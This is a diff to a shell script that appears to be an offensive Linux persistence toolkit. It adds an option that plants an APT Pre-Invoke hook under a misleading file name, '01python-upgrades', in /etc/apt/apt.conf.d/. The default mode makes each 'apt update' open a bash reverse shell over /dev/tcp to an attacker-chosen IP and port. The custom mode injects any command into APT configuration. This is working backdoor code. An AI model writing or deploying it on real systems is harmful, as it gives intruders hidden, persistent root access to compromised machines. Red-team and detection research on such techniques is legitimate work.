@@ -175,6 +175,13 @@ usage_root() {
 	echo "      --custom                     Use custom init.d backdoor settings"
 	echo "          --command <command>          Specify custom persistence command"
 	echo "          --path <path>                Specify custom path in /etc/init.d/"
+    echo "  --apt-persistence            Set up APT persistence"
+    echo "      --default                    Use default APT persistence settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "      --custom                     Use custom APT persistence settings"
+    echo "          --command <command>          Specify custom persistence command"
+    echo "          --path <path>                Specify custom path in /etc/apt/apt.conf.d/"
 }
 
 setup_systemd() {
@@ -1490,6 +1497,86 @@ setup_initd_backdoor() {
 	fi
 }
 
+setup_apt_persistence() {
+    local default=0
+    local custom=0
+    local ip=""
+    local port=""
+    local command=""
+    local path=""
+
+    while [[ "$1" != "" ]]; do
+        case $1 in
+            --default )
+                default=1
+                ;;
+            --custom )
+                custom=1
+                ;;
+            --ip )
+                shift
+                ip=$1
+                ;;
+            --port )
+                shift
+                port=$1
+                ;;
+            --command )
+                shift
+                command=$1
+                ;;
+            --path )
+                shift
+                path=$1
+                ;;
+            * )
+                echo "Invalid option for --apt-persistence: $1"
+                exit 1
+        esac
+        shift
+    done
+
+    if [[ $default -eq 1 && $custom -eq 1 ]]; then
+        echo "Error: --default and --custom cannot be specified together."
+        exit 1
+    fi
+
+    if [[ $default -eq 0 && $custom -eq 0 ]]; then
+        echo "Error: Either --default or --custom must be specified."
+        exit 1
+    fi
+
+    if ! check_root; then
+        echo "Error: This function can only be run as root."
+        exit 1
+    fi
+
+    if [[ $default -eq 1 ]]; then
+        if [[ -z $ip || -z $port ]]; then
+            echo "Error: --ip and --port must be specified when using --default."
+            exit 1
+        fi
+
+        path="/etc/apt/apt.conf.d/01python-upgrades"
+        echo -e "APT::Update::Pre-Invoke {\"(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &) &\"};" > $path
+        echo "[+] APT persistence established"
+
+    elif [[ $custom -eq 1 ]]; then
+        if [[ -z $command || -z $path ]]; then
+            echo "Error: --command and --path must be specified when using --custom."
+            exit 1
+        fi
+
+        if [[ ! -f $path ]]; then
+            echo "APT::Update::Pre-Invoke {\"$command\"};" > $path
+            echo "[+] APT persistence established"
+        else
+            echo "APT::Update::Pre-Invoke {\"$command\"};" >> $path
+            echo "[+] APT persistence established"
+        fi
+    fi
+}
+
 main() {
 	local QUIET=0
 
@@ -1613,6 +1700,11 @@ main() {
 				setup_initd_backdoor "$@"
 				exit
 				;;
+			--apt-persistence )
+                shift
+                setup_apt_persistence "$@"
+                exit
+                ;;
 			* )
 				echo "Invalid option: $1"
 				if check_root; then
